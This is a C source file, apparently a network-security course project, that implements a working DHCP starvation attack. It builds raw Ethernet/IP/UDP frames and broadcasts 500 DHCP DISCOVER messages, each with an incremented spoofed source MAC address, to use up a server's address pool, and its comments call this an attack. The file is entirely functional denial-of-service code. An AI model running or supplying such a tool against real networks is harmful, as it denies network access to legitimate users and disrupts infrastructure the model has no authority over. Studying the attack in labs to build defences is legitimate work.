#include "pds-dhcpstarve.h"

void help(){
  printf("HELP\n");
}

/**
* Eror message wrapper
*/
void err(string msg, int erno, short show_help){
  fprintf(stderr, "%s\n", msg.c_str());
  if (show_help) help();
  exit(erno);
}

/**
* Universal function for memory allocation checking
*/
void check_null(void * lel){
  if (lel == NULL) err("Memory allocation failure", ERR, 0);
}

/**
* Check argument, if correct return interface name right away
*/
char* checkArgs(int argc, char **argv) {
  if ((argc != 3 ) || (strcmp(argv[1], "-i") != 0)) {
    err("Wrong arguments", 1, 0);
  }
  return argv[2];
}

/**
* Handle the process of generating MAC adresses
*/
void increment_mac_addr (uint8_t *addr ){
  for (int i = MAC_ADDR_MAX_INDEX; i > -1; i--) {
    if (addr[i] != MAX_OCTET_HEX) { // 0xff aka 255
      addr[i]++;
      return;
    }
  }
  for (size_t i = 0; i < ETH_ALEN; i++) {
    addr[i] = 0;
  }
  addr[MAC_ADDR_MAX_INDEX] = 1;
}

/**
* Compute the checksum, inspired by rfc1071 and
* https://www.thegeekstuff.com/2012/05/ip-header-checksum
*/
void checksum(struct ip *hdr, int len){
  int sum = 0;
  hdr->ip_sum = sum;
  uint16_t* word = (uint16_t*)hdr;

  while (len > 1){
    sum += *word++;
    len -= 2;
  }
  if (len == 1){  // add leftover byte
    uint8_t answer = *(u_char *)word;
    sum += answer;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  hdr->ip_sum = ~sum;
}

/**
* Create, allocate and fill necessary values to ip header
*/
struct ip* get_ip_header(){
  struct ip* hdr = (struct ip*)malloc(sizeof(struct ip));
  check_null(hdr);

  hdr->ip_hl = 5;           // 5 bytes
  hdr->ip_v = 4;            // version 4
  hdr->ip_tos = 0;          // best effort
  hdr->ip_off = 0;          // no fragmentation
  hdr->ip_id = htons(9999); // random blob
  hdr->ip_ttl = 255;        // 255, why not it's an attack
  hdr->ip_p = IPPROTO_UDP;  // udp, RFC constant
  hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);

  inet_pton(AF_INET, IP4_SRC_ADDR, &hdr->ip_src); //Fill in ip addresses
  inet_pton(AF_INET, IP4_BROADCAST, &hdr->ip_dst);
  checksum(hdr,IP4_HEADER_LEN);
  return hdr;
}

/**
* Allocate and fill udp header
*/
struct udphdr* get_udp_header(){
  struct udphdr* udp_header = (struct udphdr*)malloc(sizeof(struct udphdr));
  check_null(udp_header);

  udp_header->source = htons(DHCP_CLIENT_PORT); // Fill ports
  udp_header->dest = htons(DHCP_SERVER_PORT);
  udp_header->check = 0 ; // checksum is not compulsory for udp in ip_v4
  udp_header->len = htons(DHCP_BUFFER_SIZE + UDP_HEADER_LEN);
  return udp_header;
}

/**
* Properly prepare dhcp discover message, rfc2132
*/
void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
  // fill the buffer with zeros and fill only relevant values
  bzero(buffer, DHCP_BUFFER_SIZE);
  buffer[0] = (int) 1;      // Request 1
  buffer[1] = (int) 1;      // Ethernet
  buffer[2] = (int) MAC_ADDR_LEN; // Skip hops
  buffer[4] = (int) rand(); // transaction xid, always different
  buffer[5] = (int) rand();
  buffer[6] = (int) rand();
  buffer[7] = (int) rand(); // xid end, skip 4 octets of ip addreses
  buffer[28] = (int) src_mac_addr[0]; // fill client mac addr
  buffer[29] = (int) src_mac_addr[1];
  buffer[30] = (int) src_mac_addr[2];
  buffer[31] = (int) src_mac_addr[3];
  buffer[32] = (int) src_mac_addr[4];
  buffer[33] = (int) src_mac_addr[5]; // skip the rest
  buffer[236] = (int) 99;             // option starts with MAGIC COOKIE
  buffer[237] = (int) 130;
  buffer[238] = (int) 83;
  buffer[239] = (int) 99;             // MAGIC COOKIE end
  buffer[240] = (int) 53;             // OPTION defining dhcp message type
  buffer[241] = (int) 1;              // length of ^
  buffer[242] = (int) 1;              // 1 == discover
  buffer[243] = (int) 55;             // OPTION Requested items
  buffer[244] = (int) 4;              // length of ^
  buffer[245] = (int) 1;              // Subnet mask
  buffer[246] = (int) 28;             // Broadcast
  buffer[247] = (int) 3;              // Router
  buffer[248] = (int) 15;             // Domain name
  buffer[249] = (int) 255;            //end
}


int main(int argc, char** argv) {
  char* interface_name = checkArgs(argc, argv); // get name of the interface
  srand(time(NULL));  // pseudo generate IP id and DHCP transaction xid
  int sd = 0;
  if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    err ("Failed to create socket", sd, 0);
  }
  uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
  uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
  for (size_t i = 0; i < MAC_ADDR_LEN; i++) {
    dst_mac_addr[i] = MAX_OCTET_HEX;  // fill with 0xff
    src_mac_addr[i] = MIN_OCTET_HEX;  // fill with 0x00
  }

  struct sockaddr_ll interface;
  if ((interface.sll_ifindex = if_nametoindex (interface_name)) == 0) {
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
  interface.sll_halen = ETH_ALEN;
  interface.sll_pkttype = PACKET_BROADCAST; // Use broadcast packet
  interface.sll_protocol = ETH_P_802_3;

  struct ip* ip_header = get_ip_header();
  struct udphdr* udp_header = get_udp_header();

  unsigned char buffer[DHCP_BUFFER_SIZE]; // dhcp message buffer

  int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
  unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
  check_null(eth_frame);

  memcpy(eth_frame, dst_mac_addr, 6 * sizeof(uint8_t));
  eth_frame[12] = 0x08; // ETH_P_IP value
  eth_frame[13] = 0x00;
  /* L2 ends here ^ Add IP (L3) and UDP (L4) headers next... */
  memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));

  // place here only parts which depends on source MAC address, src mac address
  // has to be changed in every iteration to starve the dhcp server
  for (size_t i = 0; i < 500; i++) {
    increment_mac_addr(src_mac_addr);
    // Add mac address to interface which will be used to send msg out
    memcpy(interface.sll_addr, src_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
    // copy MAC address to ETHERNET header
    memcpy(eth_frame + 6, src_mac_addr, 6 * sizeof(uint8_t));
    // include MAC address in DHCP discover message
    make_discover(buffer, src_mac_addr);  // fill buffer with discover msg
    // place the created DHCP discover to a msg buffer
    memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
    // fire
    int sent = 0;
    if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
      err("sendto() failed", sent, 0);
    }
  }
  if (close(sd) < 0) {
    err("Failed to close the socket", sd, 0);
  }
  free(udp_header);
  free(ip_header);
  free(eth_frame);
}
